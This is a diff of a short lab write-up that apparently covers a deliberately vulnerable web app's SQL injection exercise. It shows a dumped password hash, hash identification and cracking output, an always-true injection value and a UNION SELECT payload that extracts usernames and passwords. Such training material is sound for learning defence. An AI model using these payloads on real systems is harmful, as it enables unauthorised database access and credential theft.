@@ -43,7 +43,8 @@ First name: smithy
 Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 since all the password are hashed we can use tool "Hashid" to find what form of hash these password uses
- hashid 5f4dcc3b5aa765d61d8327deb882cf99
+```
+hashid 5f4dcc3b5aa765d61d8327deb882cf99
 Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
 [+] MD2
 [+] MD5
@@ -83,15 +84,18 @@ crack the hashes
  charley          (?)
  4g 0:00:00:00 DONE (2023-12-12 16:49) 133.3g/s 102400p/s 102400c/s 179200C/s skyblue..dangerous
  Warning: passwords printed above might not be all those cracked
-
+```
 
 Medium:
 Inspect the web
 Edit the Value from the choice to the condition always true
 for example 
+```
 1 OR 1 = 1
-
+```
 Higher difficulty:
 
 on the change ID insert
+```
 'Session ID: 'UNION SELECT user,password from users#' 
+```
